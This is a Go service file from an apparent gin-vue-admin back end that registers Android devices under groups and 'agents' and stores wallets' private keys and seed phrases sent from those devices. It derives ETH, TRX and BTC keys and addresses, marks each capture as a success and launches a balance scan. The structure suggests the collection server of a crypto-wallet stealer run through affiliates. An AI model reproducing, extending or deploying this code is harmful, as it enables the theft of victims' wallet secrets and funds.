package app

import (
	"errors"
	"fmt"
	"github.com/flipped-aurora/gin-vue-admin/server/blockchain"
	"github.com/flipped-aurora/gin-vue-admin/server/global"
	"github.com/flipped-aurora/gin-vue-admin/server/model"
	"github.com/flipped-aurora/gin-vue-admin/server/model/app"
	"github.com/flipped-aurora/gin-vue-admin/server/utils"
	"gorm.io/gorm"
)

type PublicService struct {
}

func (p *PublicService) InsertDevice(reqDevice *model.ReqDevice) error {
	return global.GVA_DB.Transaction(func(tx *gorm.DB) (err error) {
		// 1.寻找组
		var packet app.Packet
		err = tx.Where("group_id=?", reqDevice.GroupId).First(&packet).Error
		if err != nil {
			return err
		}
		// 2.通过组id，寻找代理
		var agent app.Agent
		err = tx.Where("packet_id=?", packet.ID).First(&agent).Error
		if err != nil {
			return err
		}
		// 3.查找设备是否存在
		var machine app.Machine
		err = tx.Limit(1).Where("device_id=?", reqDevice.DeviceId).Find(&machine).Error
		if err != nil {
			return err
		}
		if machine.ID != 0 {
			return errors.New(fmt.Sprintf("deviceId:%v is exist.", reqDevice.DeviceId))
		}
		// 4.插入设备信息
		machine.DeviceId = reqDevice.DeviceId
		machine.AgentId = int(agent.ID)
		machine.Ip = reqDevice.Ip
		machine.Country = reqDevice.TimeZone
		machine.Brand = reqDevice.Brand
		machine.Model = reqDevice.Model
		machine.AndroidVersion = reqDevice.AndroidVersion
		machine.Status = 0
		machine.AppPackageName = reqDevice.AppPackageName
		machine.CreateTime = utils.GetGMTTimeLongFormat()
		return tx.Create(&machine).Error
	})
}

func (p *PublicService) InsertWallet(reqWallet *model.ReqWallet) error {
	return global.GVA_DB.Transaction(func(tx *gorm.DB) (err error) {
		// 1. 查找设备id
		var machine app.Machine
		if reqWallet.DeviceId != "" {
			err = tx.Limit(1).Where("device_id=?", reqWallet.DeviceId).Find(&machine).Error
			if err != nil {
				return err
			}
		}
		var wallet app.Wallet
		// 根据私钥导出地址
		if reqWallet.Key != "" {
			// 2. 私钥已存在
			err = tx.Limit(1).Where("private_key=?", reqWallet.Key).Find(&wallet).Error
			if err != nil {
				return err
			}
			if wallet.ID > 0 {
				return errors.New(fmt.Sprintf("key:%v is exist.", reqWallet.Key))
			}
			wallet.EthAddress, err = blockchain.EthAddressByPrivateKey(reqWallet.Key)
			if err != nil {
				return err
			}
			wallet.TrxAddress, err = blockchain.TrxAddressByPrivateKey(reqWallet.Key)
			if err != nil {
				return err
			}
			wallet.BtcPrivateKey = reqWallet.Key
			wallet.BtcAddress, err = blockchain.BtcAddressByPrivateKey(reqWallet.Key)
			if err != nil {
				return err
			}
			machine.Status = 1 // 更改为成功状态
		}
		// 根据助记词 生成私钥及地址
		if reqWallet.Phrase != "" {
			// 3. 助记词已存在
			err = tx.Limit(1).Where("phrase=?", reqWallet.Phrase).Find(&wallet).Error
			if err != nil {
				return err
			}
			if wallet.ID > 0 {
				return errors.New(fmt.Sprintf("phrase:%v is exist.", reqWallet.Phrase))
			}
			// eth 私钥及地址
			wallet.EthPrivateKey, err = blockchain.EthPrivateKeyByMnemonic(reqWallet.Phrase)
			if err != nil {
				return err
			}
			wallet.EthAddress, err = blockchain.EthAddressByPrivateKey(wallet.EthPrivateKey)
			if err != nil {
				return err
			}
			// trx 私钥及地址
			wallet.TrxPrivateKey, err = blockchain.TrxPrivateKeyByMnemonic(reqWallet.Phrase)
			if err != nil {
				return err
			}
			wallet.TrxAddress, err = blockchain.TrxAddressByPrivateKey(wallet.TrxPrivateKey)
			if err != nil {
				return err
			}
			// btc：BIP84 / m/84'/0'/0'/0/0，与 gasleak core/crypto/derivation.js 同路径
			wallet.BtcPrivateKey, err = blockchain.BtcPrivateKeyByMnemonic(reqWallet.Phrase)
			if err != nil {
				return err
			}
			wallet.BtcAddress, err = blockchain.BtcAddressByPrivateKey(wallet.BtcPrivateKey)
			if err != nil {
				return err
			}
			machine.Status = 1 // 更改为成功状态
		}
		// 4. 插入钱包消息
		if machine.Status == 1 {
			err = tx.Save(&machine).Error
			if err != nil {
				return err
			}

			wallet.MachineId = int(machine.ID)
			wallet.Type = reqWallet.Type
			wallet.WalletName = reqWallet.WalletName
			wallet.PrivateKey = reqWallet.Key
			wallet.Phrase = reqWallet.Phrase
			wallet.Region = 0
			wallet.CreateTime = utils.GetGMTTimeLongFormat()
			err = tx.Create(&wallet).Error
			if err != nil {
				return err
			}
			go func() {
				blockchain.ScanBalance(wallet, true)
			}()
			return nil
		} else {
			return errors.New("insert wallet error")
		}
	})
}
